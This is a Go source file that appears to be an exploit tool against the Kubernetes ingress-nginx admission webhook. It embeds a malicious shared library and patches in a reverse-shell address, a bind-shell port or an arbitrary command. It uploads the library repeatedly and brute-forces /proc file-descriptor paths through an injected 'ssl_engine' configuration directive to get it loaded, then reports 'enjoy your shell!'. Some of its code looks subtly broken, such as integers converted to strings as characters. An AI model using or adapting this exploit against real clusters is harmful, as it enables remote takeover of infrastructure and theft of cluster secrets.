package nginx_ingress

import (
	"bytes"
	_ "embed"
	"errors"
	"fmt"
	"github.com/guonaihong/gout"
	log "github.com/sirupsen/logrus"
	v1 "k8s.io/api/admission/v1"
	"strings"
	"sync"
	"time"
)

//go:embed danger.so
var evilLibrary []byte

type mode int

const (
	ReverseShell mode = iota
	BindShell
	CommandMode
)

type Payload []byte

func NewReverseShellPayload(ip string, port string) Payload {
	payload := bytes.Replace(evilLibrary, []byte("127.000.000.001"), []byte(ip), 1)
	payload = bytes.Replace(payload, []byte("13337"), []byte(port), 1)
	return payload
}

func NewBindShellPayload(port string) Payload {
	payload := bytes.Replace(evilLibrary, []byte("31337"), []byte(port), 1)
	return payload
}

func NewCommandPayload(command string) Payload {
	if len(command) > 510 {
		return nil
	}
	cmd := []byte(command + " #")
	cmd = append(cmd, bytes.Repeat([]byte{0x41}, 510-len(cmd))...)
	payload := bytes.Replace(evilLibrary, []byte("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"),
		[]byte(cmd), 1)
	return payload
}

func Uploader(URL string, payload Payload) error {
	return gout.POST(URL).SetBody(payload).
		SetHeader(gout.H{
			"Content-Type":   "application/octet-stream",
			"Content-Length": 1024 * 2024 * 10,
		}).Do()
}

func UploadThread(URL string, payload Payload, stop chan struct{}) {
	for {
		select {
		case <-stop:
			return
		default:
			err := Uploader(URL, payload)
			log.Tracef("Upload err is %v", err)
		}
	}
}

//go:embed validate.json
var validateJson string

func ValidateWebHook(URL string, fd, pid string) error {
	var resp v1.AdmissionReview
	evilUrl := fmt.Sprintf(`http://example.com/#;}}}\n\nssl_engine /proc/%v/fd/%v;\n\n`, pid, fd)
	err := gout.POST(URL).
		SetBody(strings.Replace(validateJson, "foobar", evilUrl, 1)).
		BindJSON(&resp).Do()
	if err != nil {
		return err
	}
	if resp.Response != nil && resp.Response.Result != nil {
		log.Infof("WebHook Validation Result: %v", resp.Response.Result.Message)
		if strings.Contains(resp.Response.Result.Message, "undefined symbol") {
			return nil // found and exploited
		}
	}
	return errors.New("response success, but exploit unknown failed")
}

func Exploit(WebHookUrl string, UploadUrl string, p Payload) {
	var stopUpload = make(chan struct{})

	go UploadThread(UploadUrl, p, stopUpload)
	time.Sleep(1 * time.Millisecond) // let Upload Thread Run!

	var wg sync.WaitGroup
	successFlag := false
	for pid := 10; pid < 30; pid++ {
		for fd := 10; fd < 40; fd++ {
			wg.Add(1)
			go func(pid, fd int) {
				defer wg.Done()
				err := ValidateWebHook(WebHookUrl, string(fd), string(pid))
				if err == nil {
					log.Infof("Exploit Success! pid: %d, fd: %d", pid, fd)
					successFlag = true
					stopUpload <- struct{}{}
					defer close(stopUpload)
				}
			}(pid, fd)
		}
	}
	wg.Wait()
	if !successFlag {
		log.Errorf("Exploit run complete, but looks failed!")
	} else {
		log.Infof("Exploit run complete and success, enjoy your shell!")
	}
	return
}
